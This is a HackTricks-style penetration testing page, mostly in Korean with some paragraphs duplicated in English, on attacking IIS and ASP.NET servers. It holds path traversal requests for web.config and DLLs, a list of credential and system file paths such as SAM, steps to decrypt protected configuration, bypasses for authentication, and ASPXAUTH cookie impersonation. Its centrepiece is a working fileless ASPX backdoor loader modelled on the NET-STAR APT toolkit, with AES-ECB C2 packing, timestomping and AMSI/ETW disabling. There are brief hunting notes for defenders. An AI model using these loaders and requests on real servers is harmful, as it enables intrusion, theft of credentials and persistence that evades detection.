# IIS - Internet Information Services

{{#include ../../banners/hacktricks-training.md}}

테스트 실행 파일 확장자:

- asp
- aspx
- config
- php

## 내부 IP 주소 노출

IIS 서버에서 302 응답을 받는 경우 Host 헤더를 제거하고 HTTP/1.0을 사용해 보세요. 응답의 Location 헤더가 내부 IP 주소를 가리킬 수 있습니다:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
내부 IP를 노출하는 응답:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## .config 파일 실행

.config 파일을 업로드하여 코드를 실행하는 데 사용할 수 있습니다. 한 가지 방법은 파일 끝에 HTML 주석 안에 코드를 추가하는 것입니다: [예제 다운로드](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

이 취약점을 악용하는 방법과 추가 기술은 [여기](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)에서 확인하세요.

## IIS Discovery Bruteforce

제가 만든 리스트를 다운로드하세요:

{{#file}}
iisfinal.txt
{{#endfile}}

다음 리스트들의 내용을 합쳐 생성되었습니다:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

확장자를 추가하지 말고 사용하세요. 필요한 확장자는 이미 포함되어 있습니다.

## Path Traversal

### Leaking source code

전체 자세한 설명은 다음을 확인하세요: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

> [!TIP]
> 요약하자면, 애플리케이션의 폴더 안에는 "**assemblyIdentity**" 파일과 "**namespaces**"를 참조하는 여러 web.config 파일이 있습니다. 이 정보를 통해 **실행 가능한 파일의 위치를 알 수 있고** 해당 파일을 다운로드할 수 있습니다.\
> 다운로드한 **Dlls**에서 새로운 **namespaces**를 찾아 접근을 시도하고 web.config 파일을 얻어 더 많은 namespaces와 assemblyIdentity를 찾을 수 있습니다.\
> 또한 **connectionstrings.config**와 **global.asax** 파일에는 흥미로운 정보가 포함되어 있을 수 있습니다.

In **.Net MVC applications**, the **web.config** file plays a crucial role by specifying each binary file the application relies on through **"assemblyIdentity"** XML tags.

### **바이너리 파일 탐색**

아래에 web.config 파일에 접근하는 예시가 나와 있습니다:
```html
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
이 요청은 다음과 같은 다양한 설정 및 종속성을 드러냅니다:

- **EntityFramework** 버전
- **AppSettings** (웹페이지, 클라이언트 유효성 검사 및 JavaScript용)
- **System.web**의 인증 및 런타임 구성
- **System.webServer** 모듈 설정
- **Runtime**의 어셈블리 바인딩(예: **Microsoft.Owin**, **Newtonsoft.Json**, **System.Web.Mvc** 등 여러 라이브러리)

이러한 설정은 **/bin/WebGrease.dll** 같은 특정 파일들이 애플리케이션의 /bin 폴더에 위치하고 있음을 나타냅니다.

### **Root Directory Files**

루트 디렉터리에서 발견되는 파일들, 예를 들어 **/global.asax** 및 **/connectionstrings.config**(민감한 비밀번호를 포함하고 있음)는 애플리케이션의 구성 및 동작에 필수적입니다.

### **Namespaces and Web.Config**

MVC 애플리케이션은 각 파일에서 반복 선언을 피하기 위해 특정 네임스페이스용 추가 **web.config files**를 정의하기도 하며, 다른 **web.config**를 다운로드하도록 한 요청에서 그 점이 드러납니다:
```html
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **DLL 다운로드**

커스텀 네임스페이스의 언급은 /bin 디렉토리에 **WebApplication1**라는 이름의 DLL이 존재함을 암시합니다. 이어서 **WebApplication1.dll**을 다운로드하는 요청이 표시됩니다:
```html
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
이는 /bin 디렉터리에 **System.Web.Mvc.dll** 및 **System.Web.Optimization.dll** 같은 다른 필수 DLL들이 존재함을 시사합니다.

DLL이 **WebApplication1.Areas.Minded**라는 네임스페이스를 임포트하는 상황에서는, 공격자가 **/area-name/Views/** 같은 예측 가능한 경로에 다른 web.config 파일들이 존재하며 그 안에 특정 구성과 /bin 폴더의 다른 DLL들을 참조하는 항목들이 포함되어 있음을 유추할 수 있습니다. 예를 들어 **/Minded/Views/web.config**에 대한 요청은 구성과 네임스페이스를 드러내어 다른 DLL인 **WebApplication1.AdditionalFeatures.dll**의 존재를 나타낼 수 있습니다.

### 일반 파일

출처: [here](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 Error

If you see an error like the following one:

![](<../../images/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

다음과 같은 오류가 보이면:

It means that the server **didn't receive the correct domain name** inside the Host header.\
웹 서버가 Host header에 **올바른 도메인 이름을 받지 못했다**는 의미입니다.  
In order to access the web page you could take a look to the served **SSL Certificate** and maybe you can find the domain/subdomain name in there. If it isn't there you may need to **brute force VHosts** until you find the correct one.  
웹 페이지에 접근하려면 제공되는 **SSL Certificate**를 확인하여 도메인/서브도메인 이름을 찾을 수 있는지 확인하세요. 존재하지 않으면 올바른 항목을 찾을 때까지 **brute force VHosts**를 시도해야 할 수 있습니다.

## Decrypt encrypted configuration and ASP.NET Core Data Protection key rings

Two common patterns to protect secrets on IIS-hosted .NET apps are:  
IIS에 호스팅된 .NET 앱에서 비밀을 보호하기 위한 두 가지 일반적인 패턴은 다음과 같습니다:

- ASP.NET Protected Configuration (RsaProtectedConfigurationProvider) for web.config sections like <connectionStrings>.  
- ASP.NET Protected Configuration (RsaProtectedConfigurationProvider) — web.config의 <connectionStrings>와 같은 섹션에 사용됨.
- ASP.NET Core Data Protection key ring (persisted locally) used to protect application secrets and cookies.  
- ASP.NET Core Data Protection 키 링(로컬에 저장됨) — 애플리케이션 비밀과 쿠키를 보호하는 데 사용됨.

If you have filesystem or interactive access on the web server, co-located keys often allow decryption.  
웹 서버에 파일 시스템 또는 대화형 액세스가 있는 경우, 동일 위치에 있는 키로 복호화가 가능한 경우가 많습니다.

- ASP.NET (Full Framework) – decrypt protected config sections with aspnet_regiis:  
- ASP.NET (Full Framework) – 보호된 구성 섹션을 aspnet_regiis로 복호화:
```cmd
# Decrypt a section by app path (site configured in IIS)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pd "connectionStrings" -app "/MyApplication"

# Or specify the physical path (-pef/-pdf write/read to a config file under a dir)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\MyApplication"
```
- ASP.NET Core – 로컬에 저장된 Data Protection 키 링(XML/JSON 파일)을 다음과 같은 위치에서 찾아보세요:
- %PROGRAMDATA%\Microsoft\ASP.NET\DataProtection-Keys
- HKLM\SOFTWARE\Microsoft\ASP.NET\Core\DataProtection-Keys (registry)
- App-managed folder (e.g., App_Data\keys or a Keys directory next to the app)

키 링이 확보되면, 앱의 아이덴티티로 실행되는 운영자는 동일한 purposes로 IDataProtector를 인스턴스화하고 저장된 비밀을 unprotect할 수 있습니다. 키 링을 앱 파일과 함께 저장하는 잘못된 구성은 호스트가 침해된 후 오프라인 복호화를 매우 쉽게 만듭니다.

## IIS fileless backdoors and in-memory .NET loaders (NET-STAR style)

Phantom Taurus/NET-STAR toolkit은 w3wp.exe 내부에서 완전히 동작하는 fileless IIS persistence 및 post‑exploitation에 대한 성숙한 패턴을 제시합니다. 핵심 아이디어는 커스텀 tradecraft 및 탐지/헌팅에서 폭넓게 재사용 가능합니다.

Key building blocks
- ASPX bootstrapper hosting an embedded payload: 단일 .aspx 페이지(예: OutlookEN.aspx)가 Base64‑encoded, optionally Gzip‑compressed .NET DLL을 포함합니다. 트리거 요청이 들어오면 이를 디코드하고 압축을 풀어 리플렉티브 방식으로 현재 AppDomain에 로드한 뒤 메인 진입점(예: ServerRun.Run())을 호출합니다.
- Cookie‑scoped, encrypted C2 with multi‑stage packing: 작업/결과는 Gzip → AES‑ECB/PKCS7 → Base64로 래핑되어 겉보기에는 합법적인 cookie‑heavy 요청을 통해 전송됩니다; 운영자는 청크 분할을 위해 안정적인 구분자(예: "STAR")를 사용했습니다.
- Reflective .NET execution: 임의의 managed assemblies를 Base64로 받아 Assembly.Load(byte[])로 로드하고 디스크를 건드리지 않고 빠른 모듈 교체를 위해 오퍼레이터 인자를 전달합니다.
- Operating in precompiled ASP.NET sites: 사이트가 precompiled되어 있어도 보조 쉘/백도어를 추가/관리할 수 있습니다(예: dropper가 dynamic pages/handlers를 추가하거나 config handlers를 활용). 이는 bypassPrecompiledApp, addshell, listshell, removeshell 같은 명령으로 노출됩니다.
- Timestomping/metadata forgery: changeLastModified 액션을 노출하고 배포 시 timestomp(미래 컴파일 타임스탬프 포함)를 수행하여 DFIR을 방해합니다.
- Optional AMSI/ETW pre‑disable for loaders: 2단계 로더는 Assembly.Load를 호출하기 전에 AMSI와 ETW를 비활성화하여 메모리 내 페이로드에 대한 검사를 줄일 수 있습니다.

Minimal ASPX loader pattern
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
// 1) Obtain payload bytes (hard‑coded blob or from request)
string b64 = /* hardcoded or Request["d"] */;
byte[] blob = Convert.FromBase64String(b64);
// optional: decrypt here if AES is used
using(var gz = new GZipStream(new MemoryStream(blob), CompressionMode.Decompress)){
using(var ms = new MemoryStream()){
gz.CopyTo(ms);
var asm = Assembly.Load(ms.ToArray());
// 2) Invoke the managed entry point (e.g., ServerRun.Run)
var t = asm.GetType("ServerRun");
var m = t.GetMethod("Run", BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Static|BindingFlags.Instance);
object inst = m.IsStatic ? null : Activator.CreateInstance(t);
m.Invoke(inst, new object[]{ HttpContext.Current });
}
}
}
</script>
```
패킹/암호화 헬퍼 (Gzip + AES‑ECB + Base64)
```csharp
using System.Security.Cryptography;

static byte[] AesEcb(byte[] data, byte[] key, bool encrypt){
using(var aes = Aes.Create()){
aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.PKCS7; aes.Key = key;
ICryptoTransform t = encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor();
return t.TransformFinalBlock(data, 0, data.Length);
}
}

static string Pack(object obj, byte[] key){
// serialize → gzip → AES‑ECB → Base64
byte[] raw = Serialize(obj);                    // your TLV/JSON/msgpack
using var ms = new MemoryStream();
using(var gz = new GZipStream(ms, CompressionLevel.Optimal, true)) gz.Write(raw, 0, raw.Length);
byte[] enc = AesEcb(ms.ToArray(), key, true);
return Convert.ToBase64String(enc);
}

static T Unpack<T>(string b64, byte[] key){
byte[] enc = Convert.FromBase64String(b64);
byte[] cmp = AesEcb(enc, key, false);
using var gz = new GZipStream(new MemoryStream(cmp), CompressionMode.Decompress);
using var outMs = new MemoryStream(); gz.CopyTo(outMs);
return Deserialize<T>(outMs.ToArray());
}
```
Cookie/session 흐름 및 명령 표면
- Session bootstrap와 tasking은 정상적인 웹 활동에 섞이도록 cookies를 통해 전달된다.
- 실전에서 관찰된 명령에는 다음이 포함된다: fileExist, listDir, createDir, renameDir, fileRead, deleteFile, createFile, changeLastModified; addshell, bypassPrecompiledApp, listShell, removeShell; executeSQLQuery, ExecuteNonQuery; 그리고 메모리 내 .NET 실행을 위한 동적 실행 프리미티브 code_self, code_pid, run_code.

Timestomping 유틸리티
```csharp
File.SetCreationTime(path, ts);
File.SetLastWriteTime(path, ts);
File.SetLastAccessTime(path, ts);
```
Assembly.Load 전에 AMSI/ETW를 인라인으로 비활성화 (loader variant)
```csharp
// Patch amsi!AmsiScanBuffer to return E_INVALIDARG
// and ntdll!EtwEventWrite to a stub; then load operator assembly
DisableAmsi();
DisableEtw();
Assembly.Load(payloadBytes).EntryPoint.Invoke(null, new object[]{ new string[]{ /* args */ } });
```
다음에서 AMSI/ETW bypass techniques를 참조하세요: windows-hardening/av-bypass.md

Hunting notes (defenders)
- 단일의 이상한 ASPX 페이지, 매우 긴 Base64/Gzip 블롭; 쿠키가 많은 POST 요청.
- w3wp.exe 내부의 unbacked managed modules; Encrypt/Decrypt (ECB), Compress/Decompress, GetContext, Run 같은 문자열.
- 트래픽에서 "STAR" 같은 반복 구분자; ASPX/assemblies에 불일치하거나 심지어 미래 시점의 타임스탬프.

## Telerik UI WebResource.axd unsafe reflection (CVE-2025-3600)

많은 ASP.NET 앱이 Telerik UI for ASP.NET AJAX를 임베드하고 인증 없이 접근 가능한 핸들러 Telerik.Web.UI.WebResource.axd를 노출합니다. Image Editor 캐시 엔드포인트(type=iec)에 접근 가능하면, 파라미터 dkey=1 및 prtype가 unsafe reflection을 활성화하여 인증 전(pre‑auth) 어떤 public parameterless 생성자도 실행할 수 있게 합니다. 이는 범용 DoS 프리미티브를 제공하고, AppDomain.AssemblyResolve 핸들러가 안전하지 않은 앱에서는 pre‑auth RCE로 상승할 수 있습니다.

See detailed techniques and PoCs here:

{{#ref}}
telerik-ui-aspnet-ajax-unsafe-reflection-webresource-axd.md
{{#endref}}

## Old IIS vulnerabilities worth looking for


### Microsoft IIS tilde character “~” Vulnerability/Feature – Short File/Folder Name Disclosure

이 기술을 사용하면(심지어 Basic Authentication이 필요한 경우에도) 발견한 각 폴더 내부의 폴더와 파일을 열거해볼 수 있습니다.\ 이 기법의 주요 제한은 서버가 취약해도 각 파일/폴더 이름의 처음 최대 6글자와 확장자의 처음 3글자까지만 찾을 수 있다는 점입니다.

You can use [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) to test for this vulnerability:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../images/image (844).png>)

Original research: [https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)

You can also use **metasploit**: `use scanner/http/iis_shortname_scanner`

발견한 파일의 최종 이름을 찾는 좋은 아이디어는 LLMs에 옵션을 요청하는 것입니다. 예시는 스크립트 [https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py](https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py)처럼 동작합니다.

### Basic Authentication bypass

**Bypass** a basic authentication (**IIS 7.5**) trying to access: `/admin:$i30:$INDEX_ALLOCATION/admin.php` or `/admin::$INDEX_ALLOCATION/admin.php`

이 취약점과 앞의 방법을 조합해 새로운 **폴더**를 찾고 인증을 **우회**할 수 있습니다.

## ASP.NET Trace.AXD enabled debugging

ASP.NET에는 디버깅 모드가 있으며 해당 파일은 `trace.axd`입니다.

애플리케이션에 대한 일정 기간 동안의 모든 요청을 매우 상세하게 기록합니다.

이 정보에는 원격 클라이언트 IP, 세션 ID, 모든 요청 및 응답 쿠키, 물리적 경로, 소스 코드 정보 및 잠재적으로 사용자 이름과 비밀번호까지 포함됩니다.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTH는 다음 정보를 사용합니다:

- **`validationKey`** (string): hex-encoded key to use for signature validation.
- **`decryptionMethod`** (string): (default “AES”).
- **`decryptionIV`** (string): hex-encoded initialization vector (defaults to a vector of zeros).
- **`decryptionKey`** (string): hex-encoded key to use for decryption.

하지만 일부는 이 매개변수들의 기본값을 사용하고 쿠키 값으로 사용자 이메일을 사용할 수 있습니다. 따라서 동일한 플랫폼을 사용하며 ASPXAUTH 쿠키를 사용하는 다른 웹을 찾고, 공격 대상 서버에서 가장하고 싶은 사용자 이메일로 계정을 생성하면 두 번째 서버의 쿠키를 첫 번째 서버에서 재사용해 사용자를 가장할 수 있습니다.\ 이 공격은 이 [**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19)에서 성공했습니다.

## IIS Authentication Bypass with cached passwords (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Full report here](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): 코드의 버그로 인해 사용자가 제공한 비밀번호를 제대로 검사하지 않았습니다. 따라서 비밀번호 해시가 캐시에 이미 존재하는 키와 일치하는 공격자는 해당 사용자로 로그인할 수 있습니다.
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
## 참고 자료

- [Unit 42 – Phantom Taurus: 새로운 중국 Nexus APT 및 NET-STAR Malware Suite의 발견](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [AMSI/ETW bypass 배경 (HackTricks)](../../windows-hardening/av-bypass.md)

{{#include ../../banners/hacktricks-training.md}}
